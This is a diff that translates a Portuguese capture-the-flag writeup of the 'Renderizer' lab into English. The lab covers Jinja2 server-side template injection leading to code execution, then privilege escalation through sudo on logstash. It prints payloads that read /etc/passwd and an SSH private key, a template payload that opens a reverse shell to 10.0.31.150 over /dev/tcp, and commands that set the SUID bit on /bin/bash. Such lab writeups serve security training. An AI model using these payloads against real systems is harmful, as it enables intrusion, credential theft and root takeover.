@@ -1,20 +1,14 @@
 ---
 title: 'Renderizer Writeup'
 date: '2024-07-13'
-tags: ['SSTI', 'RCE', 'Linux']
+tags: ['SSTI', 'RCE', 'Linux', 'Hacking Club']
 draft: false
-summary: 'Explorando uma vulnerabilidade de SSTI em uma aplicação de live rendering, é possível obter RCE no servidor. O privilege escalation envolve permissões de sudo no logstash.'
+summary: 'Exploring an SSTI vulnerability in a live rendering application, it is possible to gain RCE on the server. The privilege escalation involves sudo permissions on logstash.'
 images: ['/static/images/renderizer-writeup-images/1.png']
 authors: ['default']
 ---
 
 ![Writeup-Renderizer 1](/static/images/renderizer-writeup-images/1.png)
-
-## **Plataforma**: Hacking Club
-
-### **Dificuldade:** Easy
-
-### **Nome**: Renderizer
 
 ---
 
@@ -37,7 +31,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-Somente as portas 22(SSH) e 80 (HTTP) estão abertas.
+Only ports 22(SSH) and 80(HTTP) are open.
 
 ---
 
@@ -51,27 +45,24 @@ Somente as portas 22(SSH) e 80 (HTTP) estão abertas.
 ![Writeup-Renderizer 4](/static/images/renderizer-writeup-images/4.png)
 ![Writeup-Renderizer 5](/static/images/renderizer-writeup-images/5.png)
 
-Ele diz que é um jinja2 , a gente pode deduzir que se trata de um SSTI (Server-Side Template Injection), pra testar eu mandei um `{{7*7}}.`
+It says it's a jinja2, so we can deduce that this is an SSTI (Server-Side Template Injection). To test, I sent `{{7*7}}.`
 
 ![Writeup-Renderizer 6](/static/images/renderizer-writeup-images/6.png)
 
-Depois de fazer algumas pesquisas , eu achei uma payload pra leitura de arquivos que funcionou.
+After doing some research, I found a payload for reading files that worked.
 
 `{{ get_flashed_messages.globals.builtins.open("/etc/passwd").read() }}`
 
 ![Writeup-Renderizer 7](/static/images/renderizer-writeup-images/7.png)
 
-john:x:1001:1001::/home/john:/bin/bash e ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash são os usuários.
-
-Tentei utilizar o mesmo pra pegar a chave ssh , mas não deu:
+I tried using the same method to grab the ssh key, but it didn't work:
 
 `{{ get_flashed_messages.globals.builtins.open("/home/john/.ssh/id_rsa").read() }}`
 
 ![Writeup-Renderizer 8](/static/images/renderizer-writeup-images/8.png)
 
-`{{ "teste".class.mro[1].subclasses() }}` tentei usar essa payload pra verificar as subclasses presentes , mas tava dando um erro acredito que o servidor tenha algum tipo de proteção, então eu fui atrás de outro jeito de verificar.
-
-E consegui assim:
+I tried using the payload `{{ "teste".class.mro[1].subclasses() }}` to check for present subclasses, but it was giving an error. I believe the server has some kind of protection, so I searched for another way to verify this.
+And I managed to do it this way:
 
 ```
 {% for subclass in ''.__class__.__mro__[1].__subclasses__() %}
@@ -86,11 +77,11 @@ E consegui assim:
 
 ![Writeup-Renderizer 9](/static/images/renderizer-writeup-images/9.png)
 
-Agora é achar a posição do array do Popen pra ganhar um RCE.
+Now, it's time to find the position of the Popen array to get RCE.
 
 ## Initial Access
 
-Payload do mano vert16x pra achar a posição do array do Popen automaticamente nos possibilitando um RCE.
+Payload from vert16x to automatically find the position of the Popen array, giving us RCE.
 
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("/bin/bash -c 'exec bash -i &>/dev/tcp/10.0.31.150/1337 <&1'").read().zfill(417)}}{%endif%}{% endfor %}
@@ -103,7 +94,7 @@ Payload do mano vert16x pra achar a posição do array do Popen automaticamente 
 `cat /etc/crontab`
 
 ![Writeup-Renderizer 11](/static/images/renderizer-writeup-images/11.png)
-Eu pensei incialmente em simplesmente alterar a pasta webapp com os comandos abaixo mas não funcionou, por alguma razão a cron não executava.
+Initially, I thought of simply altering the webapp folder with the following commands, but it didn't work, for some reason, the cron wouldn't execute.
 
 ```
 rm -rf webapp
@@ -112,24 +103,25 @@ echo 'chmod u+s /bin/bash' >> /home/john/webapp
 chmod +x webapp
 ```
 
-Então eu fui ver a pasta que estava sendo feito o backup `/var/backups`
+So I looked at the folder where backups were being made: **/var/backups**
 
 ![Writeup-Renderizer 12](/static/images/renderizer-writeup-images/12.png)
 
-Se eu tentar dar o `unzip webapp-03-01-2024.zip` ele da permission denied
+If I try to run `unzip webapp-03-01-2024.zip`, it gives a permission denied error.
 
 ![Writeup-Renderizer 13](/static/images/renderizer-writeup-images/13.png)
 
-Então a gente precisa copiar esse `webapp-03-01-2024.zip` pra pasta tmp
+So, we need to copy **webapp-03-01-2024.zip** to the tmp folder:
+
 `cp webapp-03-01-2024.zip /tmp`
 
-Na pasta tmp basta a gente unzipar o arquivo:
+In the tmp folder, we just unzip the file:
 
 `unzip webapp-03-01-2024.zip`
 
 ![Writeup-Renderizer 14](/static/images/renderizer-writeup-images/14.png)
 
-Depois de unzipar a pasta webapp tem uma variavel de ambiente `.env` que por sinal é a mesma senha do usuario que estamos logado `john` .
+After unzipping, the webapp folder contains an environment variable **.env**, which happens to be the same password as the logged-in user **john**.
 
 ![Writeup-Renderizer 15](/static/images/renderizer-writeup-images/15.png)
 
@@ -138,7 +130,7 @@ Depois de unzipar a pasta webapp tem uma variavel de ambiente `.env` que por sin
 `sudo -l`
 ![Writeup-Renderizer 16](/static/images/renderizer-writeup-images/16.png)
 
-Pra explorar o logstash a gente precisa criar um arquivo `.yaml` malicioso.
+To exploit logstash, we need to create a malicious **.yaml** file.
 
 [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/logstash)
 
@@ -161,13 +153,13 @@ output {
 
 ```
 
-depois é so rodar o comando , `sudo /root/logstash/bin/logstash -f /tmp/webapp/teste.yaml`
+Then we just run the command,`sudo /root/logstash/bin/logstash -f /tmp/webapp/teste.yaml`
 
-Demora alguns segundos pra rodar:
+It takes a few seconds to run:
 
 ![Writeup-Renderizer 18](/static/images/renderizer-writeup-images/18.png)
 
-E o /bin/bash vai virar SUID após a execução do logstash.
+And **/bin/bash** will become SUID after running logstash.
 
 ![Writeup-Renderizer 19](/static/images/renderizer-writeup-images/19.png)
 ![Writeup-Renderizer 20](/static/images/renderizer-writeup-images/20.png)
